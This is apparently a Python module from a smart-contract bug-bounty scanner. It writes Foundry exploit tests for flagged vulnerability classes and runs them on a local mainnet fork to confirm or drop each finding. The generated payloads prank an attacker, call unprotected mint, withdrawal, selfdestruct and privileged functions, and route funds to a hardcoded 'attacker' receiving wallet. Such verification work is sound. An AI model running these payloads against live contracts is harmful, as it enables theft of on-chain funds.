"""Dynamic verification: run each candidate finding's exploit PAYLOAD on a mainnet fork with Foundry.

A static detector only points at suspicious code. This stage proves (or disproves) exploitability the
only way that is sound: fork mainnet at the latest block, prank an unprivileged attacker, fire the
minimal exploit call(s), and read the result. If the payload reverts or moves no funds/state, it is NOT
a finding and is dropped. Nothing is ever broadcast - every call runs inside the local fork.

Scope, honestly: the payload is auto-generated for the classes where a generic attempt is decisive -
unprotected privileged functions (does an unauthorized call revert?), selfdestruct (does the contract
actually die / pay the attacker?), free mint, caller-chosen withdrawal, burn-from. Multi-step exploits
(reentrancy, signature replay) can't be proven by a generic payload, so they are marked
`manual` rather than falsely auto-confirmed.
"""
from __future__ import annotations

import re
import shutil
import os
import subprocess
from dataclasses import dataclass
from pathlib import Path

from .solidity import Function, SourceFile

# The attacker / receiving wallet: the exploit routes stolen funds HERE and confirms they land.
# "Funds moved to a wallet" is the theory of impact, so we check THIS wallet's balance delta.
# Override per deployment with BOUNTYSCAN_ATTACKER_WALLET.
ATTACKER_WALLET = os.environ.get("BOUNTYSCAN_ATTACKER_WALLET", "0xE4754d8237C9528FC23E81F9BB8F0aEE9B646bF8")


def _addr_literal(addr: str) -> str:
    """Embed an address as a NUMBER, not an address literal, so Solidity's EIP-55 checksum rule never
    rejects the lowercase from-DB address. A bare 40-hex `0x..` is still parsed as an address (checksum
    enforced even inside uint160(...)); the compiler's own escape is to prepend '00' -> 42 hex digits is
    a plain number, and uint160() takes the low 160 bits back to the address."""
    h = re.sub(r"[^0-9a-fA-F]", "", addr.lower().replace("0x", "")).rjust(40, "0")
    return f"address(uint160(0x00{h}))"


def forge_bin() -> str | None:
    """Locate the forge binary, robust to which user runs the service (the server runs as root but forge
    may live in another user's ~/.foundry). Order: BOUNTYSCAN_FORGE, PATH, common install dirs."""
    import glob
    candidates = [os.environ.get("BOUNTYSCAN_FORGE"), shutil.which("forge"),
                  "/usr/local/bin/forge", str(Path.home() / ".foundry" / "bin" / "forge")]
    candidates += sorted(glob.glob("/home/*/.foundry/bin/forge")) + sorted(glob.glob("/root/.foundry/bin/forge"))
    for c in candidates:
        if c and Path(c).exists():
            return c
    return None


def forge_available() -> bool:
    return forge_bin() is not None


# Detector ids whose exploit a generic payload can decide. Everything else -> manual.
AUTO_VERIFIABLE = {
    "unprotected-privileged-function",
    "unprotected-selfdestruct",
    "unrestricted-mint",
    "arbitrary-recipient-withdrawal",
    "unrestricted-burn-from",
}


@dataclass
class PayloadVerdict:
    finding: object                  # the Finding
    outcome: str                     # confirmed | reverted | no_change | manual | error
    detail: str                      # human-readable one-liner for the report
    profit_wei: int | None = None

    @property
    def is_finding(self) -> bool:
        # A payload that reverted or moved nothing is NOT a finding. `manual`/`error` are kept
        # (we could not prove the negative), `confirmed` is kept.
        return self.outcome not in ("reverted", "no_change")

    def report_line(self) -> str:
        icon = {"confirmed": "CONFIRMED", "reverted": "NOT REPRODUCIBLE (reverted)",
                "no_change": "NOT REPRODUCIBLE (no state/funds moved)",
                "manual": "MANUAL PoC REQUIRED", "error": "NOT RUN"}[self.outcome]
        return f"Payload attack: {icon} - {self.detail}"


def canonical_sig(fn: Function) -> str:
    """`name(type1,type2)` with data locations stripped and uint/int widened to 256."""
    types = []
    for p in fn.params:
        t = p.type.strip()
        t = re.sub(r"\b(memory|calldata|storage|payable)\b", "", t).strip()
        if re.fullmatch(r"uint", t):
            t = "uint256"
        elif re.fullmatch(r"int", t):
            t = "int256"
        # user-defined types (structs/enums/contracts) are not ABI-encodable generically -> bail
        types.append(t)
    return f"{fn.name}({','.join(types)})"


def _encodable(fn: Function) -> bool:
    """Only elementary ABI types can be auto-encoded with abi.encodeWithSignature."""
    ok = re.compile(r"^(address|bool|string|bytes\d*|u?int\d*|(?:address|bool|bytes\d*|u?int\d*)\[\d*\])$")
    for p in fn.params:
        t = re.sub(r"\b(memory|calldata|storage|payable)\b", "", p.type).strip()
        t = {"uint": "uint256", "int": "int256"}.get(t, t)
        if not ok.match(t):
            return False
    return True


def _arg_for(ptype: str, *, amount: bool) -> str:
    """An attacker-favourable literal for a parameter: attacker address, a nonzero amount where it
    helps (mint/withdraw), empty bytes/strings, zero otherwise."""
    t = re.sub(r"\b(memory|calldata|storage|payable)\b", "", ptype).strip()
    if t.endswith("[]"):
        return "new " + t.replace("uint ", "uint256 ").replace("int ", "int256 ") + "(0)"
    if t == "address":
        return "attacker"
    if t == "bool":
        return "false"
    if t == "string":
        return '""'
    if re.fullmatch(r"bytes\d+", t):
        return f"bytes{t[5:] or ''}(0)" if t != "bytes" else '""'
    if t == "bytes":
        return '""'
    if re.fullmatch(r"u?int\d*", t):
        return "1000000000000000000" if amount else "0"
    return "0"


def _args(fn: Function, *, amount_param_hint: bool) -> str:
    out = []
    for p in fn.params:
        t = re.sub(r"\b(memory|calldata|storage|payable)\b", "", p.type).strip()
        is_amount = amount_param_hint and re.fullmatch(r"u?int\d*", {"uint": "uint256", "int": "int256"}.get(t, t) or "") \
            and re.search(r"amount|amt|value|shares|qty|quantity|wad|tokens?", p.name or "", re.I)
        out.append(_arg_for(p.type, amount=bool(is_amount)))
    return ", ".join(out)


_HEADER = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {{Test, console2}} from "forge-std/Test.sol";
contract ExploitPoC is Test {{
    address constant TARGET = {target};
    address constant attacker = {attacker};   // receiving wallet - stolen funds must land here
    function setUp() public {{ vm.deal(attacker, 10 ether); }}   // gas stipend; impact measured as a DELTA
    // balanceOf that never reverts: returns 0 if TARGET is not an ERC-20.
    function _tok(address who) internal view returns (uint256) {{
        (bool s, bytes memory d) = TARGET.staticcall(abi.encodeWithSignature("balanceOf(address)", who));
        return (s && d.length >= 32) ? abi.decode(d, (uint256)) : 0;
    }}
    function test_payload() public {{
"""
_FOOTER = "    }\n}\n"


def build_exploit(finding, fn: Function, target: str, wallet: str = ATTACKER_WALLET) -> str | None:
    """Full Exploit.t.sol for an auto-verifiable finding, or None if it must be verified manually."""
    det = finding.detector
    if det not in AUTO_VERIFIABLE or fn is None or not _encodable(fn):
        return None
    sig = canonical_sig(fn)
    body = _HEADER.format(target=_addr_literal(target), attacker=_addr_literal(wallet))
    # prank with BOTH msg.sender and tx.origin = attacker, so a legitimate guard reverts the call.
    if det == "unprotected-selfdestruct":
        body += (
            "        uint256 codeBefore = TARGET.code.length;\n"
            "        uint256 attBefore = attacker.balance;\n"
            f'        vm.startPrank(attacker, attacker);\n'
            f'        (bool ok, ) = TARGET.call(abi.encodeWithSignature("{sig}", {_args(fn, amount_param_hint=False)}));\n'
            "        vm.stopPrank();\n"
            '        console2.log("CALL_OK", ok);\n'
            '        console2.log("CODE_DELTA", int256(TARGET.code.length) - int256(codeBefore));\n'
            '        console2.log("ATTACKER_WEI_DELTA", int256(attacker.balance) - int256(attBefore));\n'
        )
    elif det in ("unrestricted-mint", "unrestricted-burn-from"):
        body += (
            "        uint256 tb = _tok(attacker);\n"
            f'        vm.startPrank(attacker, attacker);\n'
            f'        (bool ok, ) = TARGET.call(abi.encodeWithSignature("{sig}", {_args(fn, amount_param_hint=True)}));\n'
            "        vm.stopPrank();\n"
            '        console2.log("CALL_OK", ok);\n'
            '        console2.log("TOKEN_DELTA", int256(_tok(attacker)) - int256(tb));\n'
            '        console2.log("ATTACKER_WEI_DELTA", int256(0));\n'
        )
    else:  # unprotected-privileged-function / arbitrary-recipient-withdrawal
        body += (
            "        uint256 attBefore = attacker.balance;\n"
            "        uint256 tokBefore = _tok(attacker);\n"
            f'        vm.startPrank(attacker, attacker);\n'
            f'        (bool ok, ) = TARGET.call(abi.encodeWithSignature("{sig}", {_args(fn, amount_param_hint=True)}));\n'
            "        vm.stopPrank();\n"
            '        console2.log("CALL_OK", ok);\n'
            '        console2.log("ATTACKER_WEI_DELTA", int256(attacker.balance) - int256(attBefore));\n'
            '        console2.log("TOKEN_DELTA", int256(_tok(attacker)) - int256(tokBefore));\n'
        )
    return body + _FOOTER


_LOG_RE = re.compile(r"^\s*(CALL_OK|CODE_DELTA|ATTACKER_WEI_DELTA|TOKEN_DELTA)\s+(-?\d+|true|false)\s*$", re.M)


def parse_outcome(finding, stdout: str) -> PayloadVerdict:
    """Interpret the forge logs into a verdict. Compilation/exec failures -> error (kept, not dropped)."""
    if "Compiler run failed" in stdout or "Error (" in stdout and "test_payload" not in stdout:
        return PayloadVerdict(finding, "error", "payload did not compile against this target")
    vals = {k: v for k, v in _LOG_RE.findall(stdout)}
    if "CALL_OK" not in vals:
        # forge ran but produced no logs (revert in setUp, fork error, timeout handled upstream)
        return PayloadVerdict(finding, "error", "exploit test produced no result")
    call_ok = vals["CALL_OK"] == "true"
    wei = int(vals.get("ATTACKER_WEI_DELTA", "0"))
    tok = int(vals.get("TOKEN_DELTA", "0"))
    code = int(vals.get("CODE_DELTA", "0"))
    det = finding.detector

    if not call_ok:
        return PayloadVerdict(finding, "reverted",
                              "an unprivileged attacker's call reverts - the access guard holds")
    w = ATTACKER_WALLET
    if det == "unprotected-selfdestruct":
        if code < 0:
            return PayloadVerdict(finding, "confirmed", "selfdestruct destroyed the contract code", wei)
        if wei > 0:
            return PayloadVerdict(finding, "confirmed", f"selfdestruct moved {wei} wei to the wallet {w}", wei)
        return PayloadVerdict(finding, "no_change", "call succeeds but code intact and no funds moved (post-Cancun / fallback)")
    if det in ("unrestricted-mint",):
        return (PayloadVerdict(finding, "confirmed", f"{tok} tokens freshly minted to the wallet {w}", tok) if tok > 0
                else PayloadVerdict(finding, "no_change", "call succeeds but the wallet's balance is unchanged"))
    if det in ("arbitrary-recipient-withdrawal",):
        gain = max(wei, tok)
        return (PayloadVerdict(finding, "confirmed", f"{gain} (wei/token) moved to the wallet {w}", gain) if gain > 0
                else PayloadVerdict(finding, "no_change", "withdrawal call succeeds but the wallet gained nothing"))
    if det == "unrestricted-burn-from":
        # burning a third party's balance needs a funded victim -> can't prove with a generic payload
        return PayloadVerdict(finding, "manual", "burn-from needs a funded victim; verify by hand")
    # privileged-function: a non-reverting unauthorized call is suspicious but impact isn't proven generically
    if wei > 0 or tok > 0:
        return PayloadVerdict(finding, "confirmed", f"unauthorized call moved {max(wei, tok)} to the wallet {w}", max(wei, tok))
    return PayloadVerdict(finding, "manual",
                          "unauthorized call does NOT revert - no funds moved generically; confirm the impact by hand")


def _function_of(files: list[SourceFile], finding) -> Function | None:
    for f in files:
        for c in f.contracts:
            if c.name == finding.contract:
                for fn in c.functions:
                    if fn.name == finding.function:
                        return fn
    return None


def run_payloads(findings: list, files: list[SourceFile], target: str, rpc_url: str | None,
                 fork_block: int | None = None, timeout: int = 300, workdir: Path | None = None,
                 wallet: str = ATTACKER_WALLET) -> list[PayloadVerdict]:
    """Build + run one exploit per finding. Returns a verdict per finding (same order)."""
    forge = forge_bin()
    verdicts: list[PayloadVerdict] = []
    if not forge or not rpc_url:
        reason = "forge not installed" if not forge else "no fork RPC configured"
        return [PayloadVerdict(f, "error", f"payload not run: {reason}") for f in findings]

    # One shared project (forge-std installed once) - the target is a constant in each generated test,
    # so there is no need for a per-target project, and we avoid a slow/flaky install on every contract.
    proj = Path(workdir or (Path.home() / ".bountyscan_forge" / "shared"))
    (proj / "test").mkdir(parents=True, exist_ok=True)
    (proj / "foundry.toml").write_text('[profile.default]\nsrc="src"\ntest="test"\nlibs=["lib"]\n', encoding="utf-8")
    if not _ensure_forge_std(proj, forge):
        return [PayloadVerdict(f, "error", "payload not run: forge-std unavailable") for f in findings]

    for f in findings:
        fn = _function_of(files, f)
        test = build_exploit(f, fn, target, wallet) if fn is not None else None
        if test is None:
            verdicts.append(PayloadVerdict(f, "manual", f"{f.detector}: no generic payload - verify by hand"))
            continue
        (proj / "test" / "Exploit.t.sol").write_text(test, encoding="utf-8")
        cmd = [forge, "test", "--mp", "test/Exploit.t.sol", "--fork-url", rpc_url, "-vv"]
        if fork_block:
            cmd += ["--fork-block-number", str(fork_block)]
        try:
            r = subprocess.run(cmd, cwd=proj, capture_output=True, text=True, timeout=timeout)
            verdicts.append(parse_outcome(f, r.stdout + "\n" + r.stderr))
        except subprocess.TimeoutExpired:
            verdicts.append(PayloadVerdict(f, "error", "exploit test timed out"))
        except Exception as exc:
            verdicts.append(PayloadVerdict(f, "error", f"forge run failed: {exc}"))
    return verdicts


def _ensure_forge_std(proj: Path, forge: str) -> bool:
    if (proj / "lib" / "forge-std" / "src" / "Test.sol").exists():
        return True
    try:
        subprocess.run([forge, "install", "foundry-rs/forge-std", "--no-git", "--root", str(proj)],
                       capture_output=True, text=True, timeout=180)
    except Exception:
        pass
    return (proj / "lib" / "forge-std" / "src" / "Test.sol").exists()
